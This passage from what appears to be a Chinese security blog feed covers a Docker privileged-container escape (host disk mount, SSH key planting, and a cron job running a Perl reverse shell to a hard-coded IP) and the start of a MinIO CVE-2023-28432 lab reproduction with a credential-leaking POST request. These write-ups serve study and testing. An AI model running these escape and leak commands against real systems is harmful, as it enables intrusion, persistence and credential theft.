setfcap<br></code></pre></td></tr></table></figure><p>特权模式可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> dac_override dac_read_search fowner fsetid <span class="hljs-built_in">kill</span> setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config <span class="hljs-built_in">mknod</span> lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read<br></code></pre></td></tr></table></figure><p>当前我们可以在运行容器时候使用<code>--cap-add</code> 给容器内部添加linux内核命令，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --cap-add=sys_admin [其他参数] 镜像名 [命令]<br></code></pre></td></tr></table></figure><p>因此这种方法的是不太准确的，不能确定运行容器的时候是给容器添加了命令。</p><p>还有的是如果是容器中非root用户也可能没有执行linux命令的权限。如下面的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --<span class="hljs-built_in">rm</span> -it debian:buster <span class="hljs-built_in">chown</span> 65534 /var/log/lastlog<br><br>docker run -u 65534 --<span class="hljs-built_in">rm</span> -it debian:buster <span class="hljs-built_in">chown</span> 65534 /var/log/lastlog<br><span class="hljs-built_in">chown</span>: changing ownership of <span class="hljs-string">&#x27;/var/log/lastlog&#x27;</span>: Operation not permitted<br><br>docker run --privileged -u 65534 --<span class="hljs-built_in">rm</span> -it debian:buster <span class="hljs-built_in">chown</span> 65534 /var/log/lastlog<br><span class="hljs-built_in">chown</span>: changing ownership of <span class="hljs-string">&#x27;/var/log/lastlog&#x27;</span>: Operation not permitted<br></code></pre></td></tr></table></figure><h3 id="查看tmpfs文件"><a href="#查看tmpfs文件" class="headerlink" title="查看tmpfs文件"></a>查看tmpfs文件</h3><p>使用如下命令，显示已挂载的文件系统，但只显示挂载点路径包含 <code>/proc</code> 且文件系统类型为 <code>tmpfs</code> 的条目。在这种情况下，<code>/proc</code> 目录通常用于挂载虚拟文件系统，而 <code>tmpfs</code> 则是一种用于临时文件的内存文件系统。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount |grep <span class="hljs-string">&#x27;/proc.*tmpfs&#x27;</span><br></code></pre></td></tr></table></figure><p>普通模式下，部分内核模块路径比如 &#x2F;proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求 </p><p>在普通模式下运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ce4ef7a90948:/<span class="hljs-comment"># mount |grep &#x27;/proc.*tmpfs&#x27;</span><br>tmpfs on /proc/acpi <span class="hljs-built_in">type</span> tmpfs (ro,relatime)<br>tmpfs on /proc/kcore <span class="hljs-built_in">type</span> tmpfs (rw,nosuid,size=65536k,mode=755)<br>tmpfs on /proc/keys <span class="hljs-built_in">type</span> tmpfs (rw,nosuid,size=65536k,mode=755)<br>tmpfs on /proc/timer_list <span class="hljs-built_in">type</span> tmpfs (rw,nosuid,size=65536k,mode=755)<br>tmpfs on /proc/timer_stats <span class="hljs-built_in">type</span> tmpfs (rw,nosuid,size=65536k,mode=755)<br>tmpfs on /proc/sched_debug <span class="hljs-built_in">type</span> tmpfs (rw,nosuid,size=65536k,mode=755)<br>tmpfs on /proc/scsi <span class="hljs-built_in">type</span> tmpfs (ro,relatime)<br></code></pre></td></tr></table></figure><p>而在特权模式下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@7924793b131d:/tmp<span class="hljs-comment"># mount |grep &#x27;/proc.*tmpfs&#x27;</span><br>root@7924793b131d:/tmp<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>对于docker容器，有时候可能没有wget，没有git，甚至没有vim以及vi（也没有nano），因此可以使用echo重定向到sh中，实现docker中一次性写入文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; script.sh<br>写入内容<br>EOF<br></code></pre></td></tr></table></figure><p>这段话表示的是写入内容到<code>script.sh</code>中，知道<code>EOF</code>结束。</p><h2 id="2-3-特权模式下目录挂载实现容器逃逸："><a href="#2-3-特权模式下目录挂载实现容器逃逸：" class="headerlink" title="2.3 特权模式下目录挂载实现容器逃逸："></a>2.3 特权模式下目录挂载实现容器逃逸：</h2><h3 id="2-3-1-目录挂载"><a href="#2-3-1-目录挂载" class="headerlink" title="2.3.1 目录挂载"></a>2.3.1 目录挂载</h3><p>查看是否是docker容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is Docker&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Docker&quot;</span><br></code></pre></td></tr></table></figure><p>查看是否是特权模式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -Eqi <span class="hljs-string">&quot;CapEff:.*0000003fffffffff|CapEff:.*000001ffffffffff&quot;</span> /proc/self/status &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;是特权模式&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不是特权模式，请查看procfs逃逸或者是socket逃逸&quot;</span><br></code></pre></td></tr></table></figure><p>首先查看挂载的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@7924793b131d:/<span class="hljs-comment"># df -h</span><br>Filesystem      Size  Used Avail Use% Mounted on<br>overlay          69G   19G   48G  28% /<br>tmpfs            64M     0   64M   0% /dev<br>tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup<br>shm              64M     0   64M   0% /dev/shm<br>/dev/vda1        69G   19G   48G  28% /etc/hosts<br></code></pre></td></tr></table></figure><p>可以看到<code>/etc/hosts</code> 被挂载到了 <code>/dev/vda1</code> 设备上。</p><p>在tmp目录下创建abcd目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /abcd<br></code></pre></td></tr></table></figure><p>使用<code>mount</code>挂载宿主机目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount --<span class="hljs-built_in">bind</span> &lt;宿主机挂载的目录&gt; &lt;容器内部的目录&gt; <br></code></pre></td></tr></table></figure><p>比如我需要在tmp目录下挂载宿主机的<code>/etc</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> tmp<br><span class="hljs-built_in">mkdir</span> abcd<br>mount --<span class="hljs-built_in">bind</span> /dev/vda1 /tmp/abcd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@7924793b131d:/tmp/abcc/root<span class="hljs-comment"># df -h</span><br>Filesystem      Size  Used Avail Use% Mounted on<br>overlay          69G   19G   48G  28% /<br>tmpfs            64M     0   64M   0% /dev<br>tmpfs           1.9G     0  1.9G   0% /sys/fs/cgroup<br>shm              64M     0   64M   0% /dev/shm<br>/dev/vda1        69G   19G   48G  28% /tmp/abcd<br></code></pre></td></tr></table></figure><p>如果需要取消挂载可以使用<code>umount </code>命令，如：<code>umount -v /dev/sda1 </code></p><p>这里ubuntu在tmp在不太行，可以创建一个新的目录再挂载。</p><p>可以查看到挂载成功：</p><p><img src="/../../../blog_image/image-20240315114302711-1717161065236-6.png" alt="image-20240315114302711"></p><h3 id="2-3-2-写入公钥："><a href="#2-3-2-写入公钥：" class="headerlink" title="2.3.2 写入公钥："></a>2.3.2 写入公钥：</h3><p>kali生成sshkey，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>然后将ssh的公钥<code>id_rsa.pub</code>写入目标服务器上，并且保存名称为<code>authorized_keys</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span> &gt; authorized_keys<br>id_ssh.pub的内容<br>EOF<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240315114959605-1717161065236-8.png" alt="image-20240315114959605"></p><p>kali上直接ssh连接即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa root@121.37.225.219<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240315115307556-1717161065236-7.png" alt="image-20240315115307556"></p><h3 id="2-3-3-定时任务："><a href="#2-3-3-定时任务：" class="headerlink" title="2.3.3 定时任务："></a>2.3.3 定时任务：</h3><p>定时任务一般写在<code>/var/spool/cron</code>目录下：</p><p>修改定时任务的内容，这里注意使用的是<code>&gt;&gt; </code>重定向，即追加，而不是使用<code>&gt;</code>直接覆盖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;*/1 * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;47.96.111.156&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt;&gt; ./root</span><br></code></pre></td></tr></table></figure><p>我尝试了直接修改<code>/var/spool/cron/root</code>文件发现不会自动生效，因此我们可以直接使用<code>crontab</code>的cli命令行去执行，但是crontab -e编译定时任务需要使用<code>vi/vim</code></p><p>正常情况下是可以反弹shell的。</p><p><img src="/../../../blog_image/image-20240315151620366-1717161065236-9.png" alt="image-20240315151620366"></p><h1 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h1><p>检测docker的脚本：<a href="https://github.com/teamssix/container-escape-check">container-escape-check&#x2F;README_ZH.md at main · teamssix&#x2F;container-escape-check (github.com)</a></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://mozillazg.com/2021/11/docker-container-difference-between-privileged-mode-and-non-privileged-mode.html">容器特权模式与非特权模式的区别 - mozillazg’s Blog</a></p><p><a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">容器逃逸方法检测指北 | T Wiki (teamssix.com)</a></p><p><a href="https://github.com/teamssix/container-escape-check">container-escape-check&#x2F;README_ZH.md at main · teamssix&#x2F;container-escape-check (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>云安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>云安全</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>minio从信息泄漏到RCE</title>
    <link href="/2023/12/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/"/>
    <url>/2023/12/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><p>Minio 是个基于 Golang 编写的开源对象存储套件，虽然轻量，却拥有着不错的性能。</p><p>minio存在漏洞利用，本次漏洞为<code>CVE-2023-28432</code>。</p><p>官方在 <a href="https://github.com/minio/minio/pull/8550">https://github.com/minio/minio/pull/8550</a> 中引入bootstrap API 并于 RELEASE.2019-12-17T23-16-33Z发布，用于验证服务器配置。在其<code>RELEASE.2023-03-20T20-16-18Z</code>版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码<code>MINIO_SECRET_KEY</code>和<code>MINIO_ROOT_PASSWORD</code>。</p><p>本次漏洞复现，需要使用到分布式部署。在单机情况下，复现失败。</p><p>注意点：</p><blockquote><p>版本号检测：</p><p>1.http-&gt; Get &#x2F;api&#x2F;v1&#x2F;check-version</p><p>2.版本小于RELEASE.2023-03-20T20-16-18Z则存在漏洞。</p><p>信息泄露：</p><p>POST &#x2F;minio&#x2F;bootstrap&#x2F;v1&#x2F;verify HTTP&#x2F;1.1</p></blockquote><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>参考<code>vulhub</code>的dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br>services:<br>  node1:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - --console-address<br>      - :<span class="hljs-number">9001</span><br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    ports:<br>      - <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span><br>      - <span class="hljs-number">9001</span>:<span class="hljs-number">9001</span><br>    hostname: node1<br>    volumes:<br>      - ./mnt/data1:/mnt/data1<br>  node2:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node2<br>    volumes:<br>      - ./mnt/data2:/mnt/data2<br>  node3:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node3<br>    volumes:<br>      - ./mnt/data3:/mnt/data3<br></code></pre></td></tr></table></figure><h1 id="1-未授权访问："><a href="#1-未授权访问：" class="headerlink" title="1.未授权访问："></a>1.未授权访问：</h1><h2 id="1-1-登录信息泄露："><a href="#1-1-登录信息泄露：" class="headerlink" title="1.1 登录信息泄露："></a>1.1 登录信息泄露：</h2><p>minio中web页面访问是<code>ip:9001</code>，而api服务访问则是<code>ip:9000</code></p><p>使用burp抓包，poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/minio/bootstrap/v1/verify</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9000<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure><p>或者使用curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST \<br>  http://10.10.10.129:9000/minio/bootstrap/v1/verify \<br>  -H <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept: */*&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept-Language: en-US;q=0.9,en;q=0.8&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Connection: close&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Cache-Control: max-age=0&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Length: 0&#x27;</span><br></code></pre></td></tr></table></figure><p>可以查看到相关信息：</p><p><img src="/../../blog_image/image-20231226215840140.png" alt="image-20231226215840140"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;MinioEndpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Legacy&quot;</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;SetCount&quot;</span>:<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;DrivesPerSet&quot;</span>:<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Endpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node1:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:true</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node2:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node3:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;CmdLine&quot;</span>:<span class="hljs-string">&quot;http://node1:9000/mnt/data1 http://node2:9000/mnt/data2 http://node3:9000/mnt/data3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Platform&quot;</span>:<span class="hljs-string">&quot;OS: linux | Arch: amd64&quot;</span>&#125;]<span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MinioEnv&quot;</span>:&#123;<span class="hljs-string">&quot;MINIO_ACCESS_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_CONFIG_ENV_FILE&quot;</span>:<span class="hljs-string">&quot;config.env&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_KMS_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;kms_master_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD&quot;</span>:<span class="hljs-string">&quot;minioadmin-vulhub&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_PASSWORD_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER&quot;</span>:<span class="hljs-string">&quot;minioadmin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_ROOT_USER_FILE&quot;</span>:<span class="hljs-string">&quot;access_key&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;MINIO_SECRET_KEY_FILE&quot;</span>:<span class="hljs-string">&quot;secret_key&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>可以查看<code>MINIO_ROOT_PASSWOR</code>和<code>MINIO_ROOT_USER</code></p><p>登陆成功。</p><p><img src="/../../blog_image/image-20231226215859605.png" alt="image-20231226215859605"></p><h2 id="1-2-连接minio客户端："><a href="#1-2-连接minio客户端：" class="headerlink" title="1.2 连接minio客户端："></a>1.2 连接minio客户端：</h2><p>为了更好的管理minio，官方提供了mc工具，通过输入账号和密码即可连接成功。</p><p>安装mc指令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://dl.min.io/client/mc/release/linux-amd64/mc \<br>  --create-dirs \<br>  -o <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$HOME</span>/minio-binaries/mc<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$HOME</span>/minio-binaries/<br></code></pre></td></tr></table></figure><p><strong>添加实例：</strong></p><p>使用命令<code>mc config host add miniode1 http://10.10.10.129:9000 minioadmin minioadmin-vulhub</code>进行连接，后面传入的分别是账号和密码。</p><p><img src="/../../blog_image/image-20231226215906800.png" alt="image-20231226215906800"></p><p>这里留个坑，不会使用cyberduck连接上minio。</p><p><img src="/../../blog_image/image-20231226215911642.png" alt="image-20231226215911642"></p><h1 id="2-RCE-复现"><a href="#2-RCE-复现" class="headerlink" title="2.RCE 复现"></a>2.RCE 复现</h1><h2 